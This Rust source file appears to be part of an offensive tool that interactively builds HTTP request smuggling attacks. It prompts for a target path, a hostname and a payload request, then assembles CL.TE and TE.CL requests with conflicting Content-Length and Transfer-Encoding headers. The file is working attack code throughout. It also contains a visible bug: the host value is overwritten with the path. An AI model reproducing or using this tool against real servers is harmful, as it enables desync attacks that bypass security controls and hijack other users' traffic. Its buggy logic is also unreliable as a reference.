use dns_lookup::lookup_host;
use owo_colors::{OwoColorize, colors::*};
use std::io::stdin;
use std::net::SocketAddr;
use std::path::PathBuf;
use std::{error::Error, fs, net::IpAddr};

pub enum InputType {
    File,
    Stdio,
}

impl InputType {
    fn get_input(&self) -> Option<String> {
        match self {
            InputType::File => {
                let mut path: String = String::new();
                println!("Please provide path to the file");

                stdin().read_line(&mut path).expect(&format!(
                    "Failed to read line {} from user",
                    "file_path".fg::<Green>().bold()
                ));

                let path = PathBuf::from(path.trim());
                let smuggled_request: Option<String> = match fs::read_to_string(&path) {
                    Ok(val) => Some(val),
                    Err(e) => {
                        println!("Failed to read path: {}", e.fg::<Red>().underline());
                        None
                    }
                };
                smuggled_request
            }
            InputType::Stdio => {
                let mut smuggled_request: String = String::new();
                loop {
                    println!("Please input your desired request:");
                    std::io::stdin()
                        .read_line(&mut smuggled_request)
                        .expect("Failed to read data");
                    let smuggled_request = smuggled_request.trim();
                    println!("Is the request correct : {:#?} [Y/N]", smuggled_request);
                    let mut choice: String = String::new();
                    stdin().read_line(&mut choice).expect(&format!(
                        "Failed to read line {} from user",
                        "choice".fg::<Green>().bold()
                    ));
                    match choice.trim().to_lowercase().as_str() {
                        "y" => break,
                        _ => {
                            println!("Lets try again...");
                            continue;
                        }
                    }
                }
                Some(smuggled_request)
            }
        }
    }
}

#[derive(Clone)]
pub enum SmuggleType {
    CLTE,
    TECL,
}
impl SmuggleType {
    pub fn build_request(&self, path: &str, host: &str, smuggled_request: &str) -> String {
        match self {
            SmuggleType::CLTE => {
                let chunk_body = "a";
                let body = format!(
                    "{:x}\r\n{}\r\n0\r\n\r\n{}",
                    chunk_body.len(),
                    chunk_body,
                    smuggled_request
                );
                let cl_size = body.len();

                format!(
                    "POST {} HTTP/1.1\r\nHost: {}\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: {}\r\nTransfer-Encoding: chunked\r\n\r\n{}",
                    path, host, cl_size, body
                )
            }
            SmuggleType::TECL => {
                let body = format!("{}\r\n", smuggled_request);
                let body_size = body.len();

                let content_length = format!("{:x}\r\n", body_size).len();

                format!(
                    "POST {} HTTP/1.1\r\nHost: {}\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: {}\r\nTransfer-Encoding: chunked\r\n\r\n{:x}\r\n{}0\r\n\r\n",
                    path, host, content_length, body_size, body
                )
            }
        }
    }
}

pub fn check_host(ip_addr: &str, ishttps: bool) -> Result<SocketAddr, Box<dyn Error>> {
    let ip = lookup_host(ip_addr)?
        .next()
        .ok_or("Couldnt find host address")?;
    let port: u16 = if ishttps { 443 } else { 80 };
    Ok(SocketAddr::from((ip, port)))
}

pub fn request_creator(smuggle_type: SmuggleType, input_type: InputType) -> Option<String> {
    let mut path = String::new();
    let mut host = String::new();
    println!(
        "Please input path to send the request to (example: {})",
        "/path/to/vuln".fg::<Red>().bold()
    );
    stdin().read_line(&mut path).expect(&format!(
        "Failed to read line {} from user",
        "path".fg::<Green>().bold()
    ));
    let path = path.trim();
    println!(
        "Please input hostname to which you want to send the request to (example: {})",
        "vulnerable-site.com".fg::<Blue>().underline()
    );
    stdin().read_line(&mut host).expect(&format!(
        "Failed to read line {} from user",
        "host".fg::<Green>().bold()
    ));
    let host = path.trim();
    if let Some(smuggled_request) = InputType::get_input(&input_type) {
        Some(SmuggleType::build_request(
            &smuggle_type,
            &path,
            &host,
            &smuggled_request,
        ))
    } else {
        eprintln!("Failed to create request please try again!");
        return None;
    }
}
